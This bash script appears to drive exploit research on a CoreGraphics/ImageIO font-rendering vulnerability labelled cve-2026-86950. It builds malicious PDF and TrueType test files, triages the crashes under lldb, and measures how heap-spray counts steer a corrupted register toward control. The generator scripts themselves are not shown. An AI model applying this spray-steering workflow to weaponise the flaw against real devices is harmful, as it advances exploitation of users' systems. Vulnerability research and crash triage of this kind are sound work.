#!/bin/bash
# M1-fixed census + M2 spray steering, one runner session
set -x
cd ../cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python gen_k2.py > gen_m1.txt 2>&1
./venv/bin/python gen_pdf.py k2_wild.pdf k2_wild.ttf
# M1: ASLR variance — 3 LLDBPLAIN wild with fault forensics (-k) + continue
for I in 1 2 3; do
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_wild.pdf" \
    -o "continue" \
    -k "register read" -k "thread backtrace all" \
    -k "memory read --size 8 --count 20 --format x \$x2-0x40" \
    -k "memory read --size 8 --count 20 --format x \$x27" \
    -k "memory region \$x2" -k "memory region \$x27" \
    -o "detach" -o "quit" ./render > m1_wild_$I.txt 2>&1 || true
  grep -m1 "stop reason = EXC" m1_wild_$I.txt >> m1_summary.txt || echo "wild_$I: no fault" >> m1_summary.txt
done
# M1: traced census (regions + W marching)
lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_wild.pdf" \
  -o "command script import $PWD/../cg-extract/jtrace8.py" -o "detach" -o "quit" \
  ./render > m1_trace.txt 2>&1 || true
echo "W events: $(grep -c '\[W ' m1_trace.txt)" > m1_wcount.txt
# M2: spray steering — x27 at head1 per spray count
cp ../cg-extract/gen_spray.py ../cg-extract/gen_pdf2.py .
for NS in 0 2 4 8 12 16; do
  ./venv/bin/python gen_spray.py > /dev/null 2>&1
  ./venv/bin/python gen_pdf2.py k2_spray_${NS}.pdf k2_wild.ttf $NS
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_spray_${NS}.pdf" \
    -o "command script import $PWD/../cg-extract/jtrace8.py" -o "detach" -o "quit" \
    ./render > m2_spray_${NS}.txt 2>&1 || true
  grep -m1 "\[head 1\]" m2_spray_${NS}.txt >> m2_law.txt || echo "spray $NS: no head" >> m2_law.txt
  echo "spray $NS rc-data: $(grep -c '\[W ' m2_spray_${NS}.txt) W" >> m2_law.txt
done
cat m1_summary.txt m2_law.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/{m1_*.txt,m2_*.txt} findings/
ls findings/ | wc -l
